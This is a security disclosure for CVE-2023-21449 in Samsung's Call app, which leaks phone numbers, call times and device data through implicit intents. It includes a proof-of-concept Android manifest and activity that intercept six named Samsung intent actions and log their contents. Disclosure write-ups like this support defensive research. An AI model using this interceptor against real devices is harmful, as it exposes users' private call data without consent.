# Details

<table>
    <tr>
        <td>Name</td>
        <td>Call</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.samsung.android.incallui</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.03.19</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2023.03.07</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Moderate</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-21449">CVE-2023-21449</a> (SVE-2022-0671)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$1050</td>
    </tr>
</table>

# Description

Oversecured report:
![](04%20رئيسية/Samsung%20Vulnerabilities/137.%20Call%20—%20Disclosure%20of%20phone%20numbers%20and%20phone%20data/Oversecured_report.png)

Oversecured found the Call app using implicit intents when lauching activities. They disclosed sensitive data such as phone numbers, call start times, and device data. These intents could intercept any app installed on the same device.

**Proof of Concept**

File `AndroidManifest.xml`:
```xml
<activity android:name=".InterceptActivity" android:exported="true">
    <intent-filter android:priority="999">
        <action android:name="com.samsung.rcs.contentsharing.action.RESUME_SHARE" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.samsung.crane.addreason.LAUNCH" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.samsung.rcs.contentsharing.action.VIDEO_SHARE_CAMERA" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.sec.android.app.firewall.action.CONFIG_DIALOG" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="samsung.myfiles.intent.action.LAUNCH_MY_FILES" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.hiya.block" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
```

File `InterceptActivity.java`:
```java
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    DumpUtils.dump(getIntent(), getClassLoader());
    finish();
}
```

The implementation of the `DumpUtils.dump()` method can be found in the source code. We use the functionality of the Gson library to turn objects of any class into a string and then dump it to the log.

## References

- [Oversecured Blog. Interception of Android implicit intents](https://blog.oversecured.com/Interception-of-Android-implicit-intents/)
